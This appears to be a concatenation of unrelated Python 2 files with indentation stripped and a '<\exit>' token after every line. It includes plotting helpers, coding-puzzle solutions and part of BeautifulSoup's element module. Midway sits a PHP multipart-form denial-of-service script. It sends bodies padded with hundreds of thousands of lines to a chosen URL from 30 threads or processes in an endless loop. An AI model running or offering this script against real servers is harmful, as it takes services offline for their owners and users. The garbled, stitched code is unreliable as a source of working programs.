plt.imshow(zi, vmin=z.min(), vmax=z.max(), origin='lower',<\exit>
extent=[x.min(), x.max(), y.min(), y.max()])<\exit>
plt.show()<\exit>
def plot_countour(x, y, z):<\exit>
xi = np.linspace(-2.1, 2.1, 100)<\exit>
yi = np.linspace(-2.1, 2.1, 100)<\exit>
zi = griddata((x, y), z, (xi[None, :], yi[:, None]), method='cubic')<\exit>
levels = [0.2, 0.4, 0.6, 0.8, 1.0]<\exit>
CS = plt.contour(xi, yi, zi, len(levels), linewidths=0.5, colors='k', levels=levels)<\exit>
CS = plt.contourf(xi, yi, zi, len(levels), cmap=cm.Greys_r, levels=levels)<\exit>
plt.colorbar()<\exit>
plt.xlim(-2, 2)<\exit>
plt.ylim(-2, 2)<\exit>
plt.title('griddata test')<\exit>
plt.show()<\exit>
def draw_2d_gaussian(mean=[0, 0], cov=[[1, 0], [0, 1]]):<\exit>
x_2Dgauss = np.random.multivariate_normal(mean, cov, 10000)<\exit>
f, ax = plt.subplots(figsize=(7, 7))<\exit>
ax.scatter(x_2Dgauss[:, 0], x_2Dgauss[:, 1],<\exit>
marker='o', color='green', s=4, alpha=0.3)<\exit>
plt.title('10000 samples randomly drawn from a 2D Gaussian distribution')<\exit>
plt.ylabel('x2')<\exit>
plt.xlabel('x1')<\exit>
ftext = 'p(x) ~ N(mu=(0,0)^t, cov=I)'<\exit>
plt.figtext(.15, .85, ftext, fontsize=11, ha='left')<\exit>
plt.ylim([-4, 4])<\exit>
plt.xlim([-4, 4])<\exit>
plt.show()<\exit>
def draw_bivariate_3d(mean=[0, 0], cov=[[1, 0], [0, 1]]):<\exit>
from matplotlib.mlab import bivariate_normal<\exit>
fig = plt.figure()<\exit>
ax = fig.gca(projection='3d')<\exit>
x = np.linspace(-3, 3, 30)<\exit>
y = x<\exit>
X, Y = np.meshgrid(x, y)<\exit>
Z = bivariate_normal(X, Y, mux=mean[0], muy=mean[1], sigmax=cov[0][0], sigmay=cov[1][1], sigmaxy=cov[0][1])<\exit>
surf = ax.plot_surface(X, Y, Z, rstride=1,<\exit>
cstride=1, cmap=plt.cm.coolwarm,<\exit>
linewidth=0, antialiased=False<\exit>
)<\exit>
ax.set_zlim(0, 0.2)<\exit>
ax.zaxis.set_major_locator(plt.LinearLocator(10))<\exit>
ax.zaxis.set_major_formatter(plt.FormatStrFormatter('%.02f'))<\exit>
ax.set_xlabel('X')<\exit>
ax.set_ylabel('Y')<\exit>
ax.set_zlabel('p(x)')<\exit>
plt.title('Bivariate Gaussian distribution')<\exit>
fig.colorbar(surf, shrink=0.5, aspect=7, cmap=plt.cm.coolwarm)<\exit>
plt.show()<\exit>
if __name__=="__main__":<\exit>
draw_bivariate_3d()<\exit>
class Solution:<\exit>
def divide(self, dividend, divisor):<\exit>
q = 0<\exit>
if dividend == 0 or divisor == 0:<\exit>
return 0<\exit>
MAXINT = 2147483647<\exit>
MININT = -2147483648<\exit>
if dividend == MININT and divisor == -1:<\exit>
return MAXINT<\exit>
sign = 1 if dividend*divisor > 0 else -1<\exit>
dividend, divisor = abs(dividend), abs(divisor)<\exit>
d = divisor<\exit>
q_cur = 1<\exit>
if divisor > dividend:<\exit>
return 0<\exit>
while d<<1 < dividend:<\exit>
d <<= 1<\exit>
q_cur <<= 1<\exit>
q += q_cur<\exit>
dividend -= d<\exit>
while dividend:<\exit>
if divisor > dividend:<\exit>
break<\exit>
while d > dividend:<\exit>
d >>= 1<\exit>
q_cur >>= 1<\exit>
q += q_cur<\exit>
dividend -= d<\exit>
return q*sign<\exit>
if __name__ == "__main__":<\exit>
print Solution().divide(-1, 1)<\exit>
import sys, os, django<\exit>
home = os.path.expanduser("~")<\exit>
sys.path.append(os.path.join(home, 'path/to/projectroot'))<\exit>
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "settings.active")<\exit>
django.setup()<\exit>
MOD = 10 ** 9 + 9<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.factorials = [0 for _ in xrange(26 + 1)]<\exit>
self.factorials[0] = 1<\exit>
for i in xrange(1, 26 + 1):<\exit>
self.factorials[i] = self.factorials[i - 1] * i<\exit>
N = 10 ** 5<\exit>
K = 26<\exit>
self.F = [[0 for _ in xrange(K + 1)] for _ in xrange(N + 1)]<\exit>
for j in xrange(1, K + 1):<\exit>
self.F[1][j] = j<\exit>
for i in xrange(2, N + 1):<\exit>
if i & 1 == 0:<\exit>
self.F[i][j] = (self.F[i - 1][j] * j - self.F[i / 2][j])<\exit>
else:<\exit>
self.F[i][j] = (self.F[i - 1][j] * j)<\exit>
self.F[i][j] %= MOD<\exit>
self.G = [[0 for _ in xrange(K + 1)] for _ in xrange(N + 1)]<\exit>
for j in xrange(1, K + 1):<\exit>
total = j<\exit>
for i in xrange(1, N + 1):<\exit>
self.G[i][j] = total - self.F[i][j]<\exit>
self.G[i][j] %= MOD<\exit>
total *= j<\exit>
total %= MOD<\exit>
def solve(self, cipher):<\exit>
N, K = cipher<\exit>
P = 0<\exit>
if K == 1:<\exit>
P += self.G[N][K]<\exit>
else:<\exit>
for j in xrange(K, 0, -1):<\exit>
P += (-1) ** (K - j) * self.G[N][j] * (<\exit>
self.factorials[K] / (self.factorials[j] * self.factorials[K - j]))<\exit>
P %= MOD<\exit>
result = P * (self.factorials[26] / (self.factorials[K] * self.factorials[26 - K]))<\exit>
return result % MOD<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
solution = Solution()<\exit>
for t in xrange(testcases):<\exit>
cipher = map(lambda x: int(x), f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
import urllib, urllib2<\exit>
import datetime<\exit>
from threading import Thread<\exit>
from multiprocessing import Process<\exit>
from optparse import OptionParser<\exit>
import random<\exit>
import string<\exit>
def http_proxy(proxy_url):<\exit>
proxy_handler = urllib2.ProxyHandler({"http": proxy_url})<\exit>
null_proxy_handler = urllib2.ProxyHandler({})<\exit>
opener = urllib2.build_opener(proxy_handler)<\exit>
urllib2.install_opener(opener)<\exit>
def check_php_multipartform_dos(url, post_body, headers):<\exit>
req = urllib2.Request(url)<\exit>
for key in headers.keys():<\exit>
req.add_header(key, headers[key])<\exit>
starttime = datetime.datetime.now();<\exit>
try:<\exit>
fd = urllib2.urlopen(req, post_body)<\exit>
except urllib2.HTTPError, e:<\exit>
print e<\exit>
endtime = datetime.datetime.now()<\exit>
usetime = (endtime - starttime).seconds<\exit>
if usetime > 5:<\exit>
result = url + " is vulnerable"<\exit>
else:<\exit>
if usetime > 3:<\exit>
result = "need to check normal respond time"<\exit>
else:<\exit>
result = "normal"<\exit>
return [result, usetime]<\exit>
def main(options, args):<\exit>
if options.target:<\exit>
target = options.target<\exit>
else:<\exit>
return<\exit>
num = options.lines<\exit>
headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',<\exit>
'Accept-Encoding': 'gzip, deflate',<\exit>
'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}<\exit>
body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"<\exit>
ch = random.choice(string.ascii_lowercase)<\exit>
payload = "\n".join(ch * num)<\exit>
body += payload<\exit>
body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"<\exit>
print "Starting..."<\exit>
respond = check_php_multipartform_dos(target, body, headers)<\exit>
print "Result: ",<\exit>
print respond[0]<\exit>
print "Respond time: " + str(respond[1]) + " seconds"<\exit>
class WorkerMixin():<\exit>
def __init__(self, options, args):<\exit>
self.options = options<\exit>
self.args = args<\exit>
def run(self):<\exit>
while True:<\exit>
main(self.options, self.args)<\exit>
class WorkerThread(WorkerMixin, Thread):<\exit>
def __init__(self, options, args):<\exit>
WorkerMixin.__init__(self, options, args)<\exit>
Thread.__init__(self)<\exit>
class WorkerProcess(WorkerMixin, Process):<\exit>
def __init__(self, options, args):<\exit>
WorkerMixin.__init__(self, options, args)<\exit>
Process.__init__(self)<\exit>
if __name__ == "__main__":<\exit>
parser = OptionParser()<\exit>
parser.add_option("-t", "--target", action="store",<\exit>
dest="target",<\exit>
default=False,<\exit>
type="string",<\exit>
help="test target"<\exit>
)<\exit>
parser.add_option("-l", "--lines", action="store",<\exit>
dest="lines",<\exit>
default=350000,<\exit>
type="int",<\exit>
help="lines of content"<\exit>
)<\exit>
parser.add_option("-n", "--threads", action="store",<\exit>
dest="threads",<\exit>
default=30,<\exit>
type="int",<\exit>
help="number of threads"<\exit>
)<\exit>
parser.add_option("-p", "--process", action="store_true",<\exit>
dest="process",<\exit>
default=False,<\exit>
help="run it using process instead of thread"<\exit>
)<\exit>
(options, args) = parser.parse_args()<\exit>
print "number of threads: %d" % options.threads<\exit>
print "number of lines: %d" % options.lines<\exit>
if options.process:<\exit>
print "running with Process"<\exit>
for i in xrange(options.threads):<\exit>
WorkerProcess(options, args).start()<\exit>
else:<\exit>
print "running with Thread"<\exit>
for i in xrange(options.threads):<\exit>
WorkerThread(options, args).start()<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.combs = {}<\exit>
def solve(self, cipher):<\exit>
C, N = cipher<\exit>
return self.get_combinations(N, C, 0)<\exit>
def get_combinations(self, t, lst, k):<\exit>
if t == 0:<\exit>
return 1<\exit>
if t < 0 or k >= len(lst):<\exit>
return 0<\exit>
if (t, k) not in self.combs:<\exit>
cnt = 0<\exit>
while t >= 0:<\exit>
cnt += self.get_combinations(t, lst, k + 1)<\exit>
t -= lst[k]<\exit>
self.combs[(t, k)] = cnt<\exit>
return self.combs[(t, k)]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
C = map(int, f.readline().strip().split(', '))<\exit>
N = int(f.readline().strip())<\exit>
cipher = C, N<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
m, n, A, B = cipher<\exit>
f = [["" for _ in xrange(n + 1)] for _ in xrange(m + 1)]<\exit>
for i in xrange(1, m + 1):<\exit>
for j in xrange(1, n + 1):<\exit>
if A[i - 1] == B[j - 1]:<\exit>
f[i][j] = f[i - 1][j - 1] + " " + A[i - 1]<\exit>
else:<\exit>
if len(f[i - 1][j]) > len(f[i][j - 1]):<\exit>
f[i][j] = f[i - 1][j]<\exit>
else:<\exit>
f[i][j] = f[i][j - 1]<\exit>
return f[m][n].strip()<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
m, n = map(int, f.readline().strip().split(' '))<\exit>
A = f.readline().strip().split(' ')<\exit>
B = f.readline().strip().split(' ')<\exit>
cipher = m, n, A, B<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
maxa = 1<\exit>
f = [1 for _ in xrange(N)]<\exit>
for i in xrange(1, N):<\exit>
for j in xrange(i):<\exit>
if A[i] > A[j]:<\exit>
f[i] = max(f[i], f[j] + 1)<\exit>
maxa = max(maxa, f[i])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
A = []<\exit>
for _ in xrange(N):<\exit>
A.append(int(f.readline().strip()))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
maxa = max(A)<\exit>
if maxa < 0:<\exit>
return "%d %d" % (maxa, maxa)<\exit>
sum_b = sum(filter(lambda x: x > 0, A))<\exit>
sum_a = 0<\exit>
current_sum = 0<\exit>
for a in A:<\exit>
current_sum += a<\exit>
if current_sum < 0:<\exit>
current_sum = 0<\exit>
sum_a = max(sum_a, current_sum)<\exit>
return "%d %d" % (sum_a, sum_b)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class LazyDataStore(object):<\exit>
def __init__(self):<\exit>
self.existing_attr = 5<\exit>
def __getattr__(self, name):<\exit>
value = 'Value for % s' % name<\exit>
setattr(self, name, value)<\exit>
return value<\exit>
class LazyDataStore2(object):<\exit>
def __init__(self):<\exit>
self.existing_attr = 5<\exit>
def __getattribute__(self, name):<\exit>
try:<\exit>
return super(LazyDataStore2, self).__getattribute__(name)<\exit>
except AttributeError:<\exit>
value = 'Value for %s' % name<\exit>
setattr(self, name, value)<\exit>
return value<\exit>
def __setattr__(self, name, value):<\exit>
print "Aspect: Save some data to the DB log"<\exit>
super(LazyDataStore2, self).__setattr__(name, value)<\exit>
class DictionaryDB(object):<\exit>
def __init__(self, data):<\exit>
self._data = data<\exit>
def __getattribute__(self, name):<\exit>
_data = super(DictionaryDB, self).__getattribute__('_data')<\exit>
return _data[name]<\exit>
import collections<\exit>
import re<\exit>
import sys<\exit>
import warnings<\exit>
from bs4.dammit import EntitySubstitution<\exit>
DEFAULT_OUTPUT_ENCODING = "utf-8"<\exit>
PY3K = (sys.version_info[0] > 2)<\exit>
whitespace_re = re.compile("\s+")<\exit>
def _alias(attr):<\exit>
@property<\exit>
def alias(self):<\exit>
return getattr(self, attr)<\exit>
@alias.setter<\exit>
def alias(self):<\exit>
return setattr(self, attr)<\exit>
return alias<\exit>
class NamespacedAttribute(unicode):<\exit>
def __new__(cls, prefix, name, namespace=None):<\exit>
if name is None:<\exit>
obj = unicode.__new__(cls, prefix)<\exit>
else:<\exit>
obj = unicode.__new__(cls, prefix + ":" + name)<\exit>
obj.prefix = prefix<\exit>
obj.name = name<\exit>
obj.namespace = namespace<\exit>
return obj<\exit>
class AttributeValueWithCharsetSubstitution(unicode):<\exit>
class CharsetMetaAttributeValue(AttributeValueWithCharsetSubstitution):<\exit>
def __new__(cls, original_value):<\exit>
obj = unicode.__new__(cls, original_value)<\exit>
obj.original_value = original_value<\exit>
return obj<\exit>
def encode(self, encoding):<\exit>
return encoding<\exit>
class ContentMetaAttributeValue(AttributeValueWithCharsetSubstitution):<\exit>
CHARSET_RE = re.compile("((^|;)\s*charset=)([^;]*)", re.M)<\exit>
def __new__(cls, original_value):<\exit>
match = cls.CHARSET_RE.search(original_value)<\exit>
if match is None:<\exit>
return unicode.__new__(unicode, original_value)<\exit>
obj = unicode.__new__(cls, original_value)<\exit>
obj.original_value = original_value<\exit>
return obj<\exit>
def encode(self, encoding):<\exit>
def rewrite(match):<\exit>
return match.group(1) + encoding<\exit>
return self.CHARSET_RE.sub(rewrite, self.original_value)<\exit>
class PageElement(object):<\exit>
FORMATTERS = {<\exit>
"html" : EntitySubstitution.substitute_html,<\exit>
"minimal" : EntitySubstitution.substitute_xml,<\exit>
None : None<\exit>
}<\exit>
@classmethod<\exit>
def format_string(self, s, formatter='minimal'):<\exit>
if not callable(formatter):<\exit>
formatter = self.FORMATTERS.get(<\exit>
formatter, EntitySubstitution.substitute_xml)<\exit>
if formatter is None:<\exit>
output = s<\exit>
else:<\exit>
output = formatter(s)<\exit>
return output<\exit>
def setup(self, parent=None, previous_element=None):<\exit>
self.parent = parent<\exit>
self.previous_element = previous_element<\exit>
if previous_element is not None:<\exit>
self.previous_element.next_element = self<\exit>
self.next_element = None<\exit>
self.previous_sibling = None<\exit>
self.next_sibling = None<\exit>
if self.parent is not None and self.parent.contents:<\exit>
self.previous_sibling = self.parent.contents[-1]<\exit>
self.previous_sibling.next_sibling = self<\exit>
nextSibling = _alias("next_sibling")<\exit>
previousSibling = _alias("previous_sibling")<\exit>
def replace_with(self, replace_with):<\exit>
if replace_with is self:<\exit>
return<\exit>
if replace_with is self.parent:<\exit>
raise ValueError("Cannot replace a Tag with its parent.")<\exit>
old_parent = self.parent<\exit>
my_index = self.parent.index(self)<\exit>
self.extract()<\exit>
old_parent.insert(my_index, replace_with)<\exit>
return self<\exit>
replaceWith = replace_with<\exit>
def unwrap(self):<\exit>
my_parent = self.parent<\exit>
my_index = self.parent.index(self)<\exit>
self.extract()<\exit>
for child in reversed(self.contents[:]):<\exit>
my_parent.insert(my_index, child)<\exit>
return self<\exit>
replace_with_children = unwrap<\exit>
replaceWithChildren = unwrap<\exit>
def wrap(self, wrap_inside):<\exit>
me = self.replace_with(wrap_inside)<\exit>
wrap_inside.append(me)<\exit>
return wrap_inside<\exit>
def extract(self):<\exit>
if self.parent is not None:<\exit>
del self.parent.contents[self.parent.index(self)]<\exit>
last_child = self._last_descendant()<\exit>
next_element = last_child.next_element<\exit>
if self.previous_element is not None:<\exit>
self.previous_element.next_element = next_element<\exit>
if next_element is not None:<\exit>
next_element.previous_element = self.previous_element<\exit>
self.previous_element = None<\exit>
last_child.next_element = None<\exit>
self.parent = None<\exit>
if self.previous_sibling is not None:<\exit>
self.previous_sibling.next_sibling = self.next_sibling<\exit>
if self.next_sibling is not None:<\exit>
self.next_sibling.previous_sibling = self.previous_sibling<\exit>
self.previous_sibling = self.next_sibling = None<\exit>
return self<\exit>
def _last_descendant(self):<\exit>
"Finds the last element beneath this object to be parsed."<\exit>
last_child = self<\exit>
while hasattr(last_child, 'contents') and last_child.contents:<\exit>
last_child = last_child.contents[-1]<\exit>
return last_child<\exit>
_lastRecursiveChild = _last_descendant<\exit>
def insert(self, position, new_child):<\exit>
if new_child is self:<\exit>
raise ValueError("Cannot insert a tag into itself.")<\exit>
if (isinstance(new_child, basestring)<\exit>
and not isinstance(new_child, NavigableString)):<\exit>
new_child = NavigableString(new_child)<\exit>
position = min(position, len(self.contents))<\exit>
if hasattr(new_child, 'parent') and new_child.parent is not None:<\exit>
if new_child.parent is self:<\exit>
current_index = self.index(new_child)<\exit>
if current_index < position:<\exit>
position -= 1<\exit>
new_child.extract()<\exit>
new_child.parent = self<\exit>
previous_child = None<\exit>
if position == 0:<\exit>
new_child.previous_sibling = None<\exit>
new_child.previous_element = self<\exit>
else:<\exit>
previous_child = self.contents[position - 1]<\exit>
new_child.previous_sibling = previous_child<\exit>
new_child.previous_sibling.next_sibling = new_child<\exit>
new_child.previous_element = previous_child._last_descendant()<\exit>
if new_child.previous_element is not None:<\exit>
new_child.previous_element.next_element = new_child<\exit>
new_childs_last_element = new_child._last_descendant()<\exit>
if position >= len(self.contents):<\exit>
new_child.next_sibling = None<\exit>
parent = self<\exit>
parents_next_sibling = None<\exit>
while parents_next_sibling is None and parent is not None:<\exit>
parents_next_sibling = parent.next_sibling<\exit>
parent = parent.parent<\exit>
if parents_next_sibling is not None:<\exit>
break<\exit>
if parents_next_sibling is not None:<\exit>
new_childs_last_element.next_element = parents_next_sibling<\exit>
else:<\exit>
new_childs_last_element.next_element = None<\exit>
else:<\exit>
next_child = self.contents[position]<\exit>
new_child.next_sibling = next_child<\exit>
if new_child.next_sibling is not None:<\exit>
new_child.next_sibling.previous_sibling = new_child<\exit>
new_childs_last_element.next_element = next_child<\exit>
if new_childs_last_element.next_element is not None:<\exit>
new_childs_last_element.next_element.previous_element = new_childs_last_element<\exit>
self.contents.insert(position, new_child)<\exit>
def append(self, tag):<\exit>
self.insert(len(self.contents), tag)<\exit>
def insert_before(self, predecessor):<\exit>
if self is predecessor:<\exit>
raise ValueError("Can't insert an element before itself.")<\exit>
parent = self.parent<\exit>
if parent is None:<\exit>
raise ValueError(<\exit>
"Element has no parent, so 'before' has no meaning.")<\exit>
if isinstance(predecessor, PageElement):<\exit>
predecessor.extract()<\exit>
index = parent.index(self)<\exit>
parent.insert(index, predecessor)<\exit>
def insert_after(self, successor):<\exit>
if self is successor:<\exit>
raise ValueError("Can't insert an element after itself.")<\exit>
parent = self.parent<\exit>
if parent is None:<\exit>
raise ValueError(<\exit>
"Element has no parent, so 'after' has no meaning.")<\exit>
if isinstance(successor, PageElement):<\exit>
successor.extract()<\exit>
index = parent.index(self)<\exit>
parent.insert(index+1, successor)<\exit>
def find_next(self, name=None, attrs={}, text=None, **kwargs):<\exit>
return self._find_one(self.find_all_next, name, attrs, text, **kwargs)<\exit>
findNext = find_next<\exit>
def find_all_next(self, name=None, attrs={}, text=None, limit=None,<\exit>
**kwargs):<\exit>
return self._find_all(name, attrs, text, limit, self.next_elements,<\exit>
**kwargs)<\exit>
findAllNext = find_all_next<\exit>
def find_next_sibling(self, name=None, attrs={}, text=None, **kwargs):<\exit>
return self._find_one(self.find_next_siblings, name, attrs, text,<\exit>
**kwargs)<\exit>
findNextSibling = find_next_sibling<\exit>
def find_next_siblings(self, name=None, attrs={}, text=None, limit=None,<\exit>
**kwargs):<\exit>
return self._find_all(name, attrs, text, limit,<\exit>
self.next_siblings, **kwargs)<\exit>
findNextSiblings = find_next_siblings<\exit>
fetchNextSiblings = find_next_siblings<\exit>
def find_previous(self, name=None, attrs={}, text=None, **kwargs):<\exit>
return self._find_one(<\exit>
self.find_all_previous, name, attrs, text, **kwargs)<\exit>
findPrevious = find_previous<\exit>
def find_all_previous(self, name=None, attrs={}, text=None, limit=None,<\exit>
**kwargs):<\exit>
return self._find_all(name, attrs, text, limit, self.previous_elements,<\exit>
**kwargs)<\exit>
findAllPrevious = find_all_previous<\exit>
fetchPrevious = find_all_previous<\exit>
def find_previous_sibling(self, name=None, attrs={}, text=None, **kwargs):<\exit>
return self._find_one(self.find_previous_siblings, name, attrs, text,<\exit>
**kwargs)<\exit>
findPreviousSibling = find_previous_sibling<\exit>
def find_previous_siblings(self, name=None, attrs={}, text=None,<\exit>
limit=None, **kwargs):<\exit>
return self._find_all(name, attrs, text, limit,<\exit>
self.previous_siblings, **kwargs)<\exit>
findPreviousSiblings = find_previous_siblings<\exit>
fetchPreviousSiblings = find_previous_siblings<\exit>
def find_parent(self, name=None, attrs={}, **kwargs):<\exit>
r = None<\exit>
l = self.find_parents(name, attrs, 1)<\exit>
if l:<\exit>
r = l[0]<\exit>
return r<\exit>
findParent = find_parent<\exit>
def find_parents(self, name=None, attrs={}, limit=None, **kwargs):<\exit>
return self._find_all(name, attrs, None, limit, self.parents,<\exit>
**kwargs)<\exit>
findParents = find_parents<\exit>
fetchParents = find_parents<\exit>
@property<\exit>
def next(self):<\exit>
return self.next_element<\exit>
@property<\exit>
def previous(self):<\exit>
return self.previous_element<\exit>
def _find_one(self, method, name, attrs, text, **kwargs):<\exit>
r = None<\exit>
l = method(name, attrs, text, 1, **kwargs)<\exit>
if l:<\exit>
r = l[0]<\exit>
return r<\exit>
def _find_all(self, name, attrs, text, limit, generator, **kwargs):<\exit>
"Iterates over a generator looking for things that match."<\exit>
if isinstance(name, SoupStrainer):<\exit>
strainer = name<\exit>
elif text is None and not limit and not attrs and not kwargs:<\exit>
if name is True or name is None:<\exit>
return [element for element in generator<\exit>
if isinstance(element, Tag)]<\exit>
elif isinstance(name, basestring):<\exit>
return [element for element in generator<\exit>
if isinstance(element, Tag) and element.name == name]<\exit>
else:<\exit>
strainer = SoupStrainer(name, attrs, text, **kwargs)<\exit>
else:<\exit>
strainer = SoupStrainer(name, attrs, text, **kwargs)<\exit>
results = ResultSet(strainer)<\exit>
while True:<\exit>
try:<\exit>
i = next(generator)<\exit>
except StopIteration:<\exit>
break<\exit>
if i:<\exit>
found = strainer.search(i)<\exit>
if found:<\exit>
results.append(found)<\exit>
if limit and len(results) >= limit:<\exit>
break<\exit>
return results<\exit>
@property<\exit>
def next_elements(self):<\exit>
i = self.next_element<\exit>
while i is not None:<\exit>
yield i<\exit>
i = i.next_element<\exit>
@property<\exit>
def next_siblings(self):<\exit>
i = self.next_sibling<\exit>
while i is not None:<\exit>
yield i<\exit>
i = i.next_sibling<\exit>
@property<\exit>
def previous_elements(self):<\exit>
i = self.previous_element<\exit>
while i is not None:<\exit>
yield i<\exit>
i = i.previous_element<\exit>
@property<\exit>
def previous_siblings(self):<\exit>
i = self.previous_sibling<\exit>
while i is not None:<\exit>
yield i<\exit>
i = i.previous_sibling<\exit>
@property<\exit>
def parents(self):<\exit>
i = self.parent<\exit>
while i is not None:<\exit>
yield i<\exit>
i = i.parent<\exit>
tag_name_re = re.compile('^[a-z0-9]+$')<\exit>
attribselect_re = re.compile(<\exit>
r'^(?P<tag>\w+)?\[(?P<attribute>\w+)(?P<operator>[=~\|\^\$\*]?)' +<\exit>
r'=?"?(?P<value>[^\]"]*)"?\]$'<\exit>
)<\exit>
def _attr_value_as_string(self, value, default=None):<\exit>
value = self.get(value, default)<\exit>
if isinstance(value, list) or isinstance(value, tuple):<\exit>
value =" ".join(value)<\exit>
return value<\exit>
def _attribute_checker(self, operator, attribute, value=''):<\exit>
if operator == '=':<\exit>
return lambda el: el._attr_value_as_string(attribute) == value<\exit>
elif operator == '~':<\exit>
def _includes_value(element):<\exit>
attribute_value = element.get(attribute, [])<\exit>
if not isinstance(attribute_value, list):<\exit>
attribute_value = attribute_value.split()<\exit>
return value in attribute_value<\exit>
return _includes_value<\exit>
elif operator == '^':<\exit>
return lambda el: el._attr_value_as_string(<\exit>
attribute, '').startswith(value)<\exit>
elif operator == '$':<\exit>
return lambda el: el._attr_value_as_string(<\exit>
attribute, '').endswith(value)<\exit>
elif operator == '*':<\exit>
return lambda el: value in el._attr_value_as_string(attribute, '')<\exit>
elif operator == '|':<\exit>
def _is_or_starts_with_dash(element):<\exit>
attribute_value = element._attr_value_as_string(attribute, '')<\exit>
return (attribute_value == value or attribute_value.startswith(<\exit>
value + '-'))<\exit>
return _is_or_starts_with_dash<\exit>
else:<\exit>
return lambda el: el.has_attr(attribute)<\exit>
def select(self, selector):<\exit>
tokens = selector.split()<\exit>
current_context = [self]<\exit>
for index, token in enumerate(tokens):<\exit>
if tokens[index - 1] == '>':<\exit>
continue<\exit>
m = self.attribselect_re.match(token)<\exit>
if m is not None:<\exit>
tag, attribute, operator, value = m.groups()<\exit>
if not tag:<\exit>
tag = True<\exit>
checker = self._attribute_checker(operator, attribute, value)<\exit>
found = []<\exit>
for context in current_context:<\exit>
found.extend(<\exit>
[el for el in context.find_all(tag) if checker(el)])<\exit>
current_context = found<\exit>
continue<\exit>
if '#' in token:<\exit>
tag, id = token.split('#', 1)<\exit>
if tag == "":<\exit>
tag = True<\exit>
el = current_context[0].find(tag, {'id': id})<\exit>
if el is None:<\exit>
return []<\exit>
current_context = [el]<\exit>
continue<\exit>
if '.' in token:<\exit>
tag_name, klass = token.split('.', 1)<\exit>
if not tag_name:<\exit>
tag_name = True<\exit>
classes = set(klass.split('.'))<\exit>
found = []<\exit>
def classes_match(tag):<\exit>
if tag_name is not True and tag.name != tag_name:<\exit>
return False<\exit>
if not tag.has_attr('class'):<\exit>
return False<\exit>
return classes.issubset(tag['class'])<\exit>
for context in current_context:<\exit>
found.extend(context.find_all(classes_match))<\exit>
current_context = found<\exit>
continue<\exit>
if token == '*':<\exit>
found = []<\exit>
for context in current_context:<\exit>
found.extend(context.findAll(True))<\exit>
current_context = found<\exit>
continue<\exit>
if token == '>':<\exit>
tag = tokens[index + 1]<\exit>
if not tag:<\exit>
tag = True<\exit>
found = []<\exit>
for context in current_context:<\exit>
found.extend(context.find_all(tag, recursive=False))<\exit>
current_context = found<\exit>
continue<\exit>
if not self.tag_name_re.match(token):<\exit>
return []<\exit>
found = []<\exit>
for context in current_context:<\exit>
found.extend(context.findAll(token))<\exit>
current_context = found<\exit>
return current_context<\exit>
def nextGenerator(self):<\exit>
return self.next_elements<\exit>
def nextSiblingGenerator(self):<\exit>
return self.next_siblings<\exit>
def previousGenerator(self):<\exit>
return self.previous_elements<\exit>
def previousSiblingGenerator(self):<\exit>
return self.previous_siblings<\exit>
def parentGenerator(self):<\exit>
return self.parents<\exit>
class NavigableString(unicode, PageElement):<\exit>
PREFIX = ''<\exit>
SUFFIX = ''<\exit>
def __new__(cls, value):<\exit>
if isinstance(value, unicode):<\exit>
return unicode.__new__(cls, value)<\exit>
return unicode.__new__(cls, value, DEFAULT_OUTPUT_ENCODING)<\exit>
def __getnewargs__(self):<\exit>
return (unicode(self),)<\exit>
def __getattr__(self, attr):<\exit>
if attr == 'string':<\exit>
return self<\exit>
else:<\exit>
raise AttributeError(<\exit>
"'%s' object has no attribute '%s'" % (<\exit>
self.__class__.__name__, attr))<\exit>
def output_ready(self, formatter="minimal"):<\exit>
output = self.format_string(self, formatter)<\exit>
return self.PREFIX + output + self.SUFFIX<\exit>
class PreformattedString(NavigableString):<\exit>
def output_ready(self, formatter="minimal"):<\exit>
self.format_string(self, formatter)<\exit>
return self.PREFIX + self + self.SUFFIX<\exit>
class CData(PreformattedString):<\exit>
PREFIX = u'<![CDATA['<\exit>
SUFFIX = u']]>'<\exit>
class ProcessingInstruction(PreformattedString):<\exit>
PREFIX = u'<?'<\exit>
SUFFIX = u'?>'<\exit>
class Comment(PreformattedString):<\exit>
PREFIX = u'<!--'<\exit>
SUFFIX = u'-->'<\exit>
class Declaration(PreformattedString):<\exit>
PREFIX = u'<!'<\exit>
SUFFIX = u'!>'<\exit>
class Doctype(PreformattedString):<\exit>
@classmethod<\exit>
def for_name_and_ids(cls, name, pub_id, system_id):<\exit>
value = name<\exit>
if pub_id is not None:<\exit>
value += ' PUBLIC "%s"' % pub_id<\exit>
if system_id is not None:<\exit>
value += ' "%s"' % system_id<\exit>
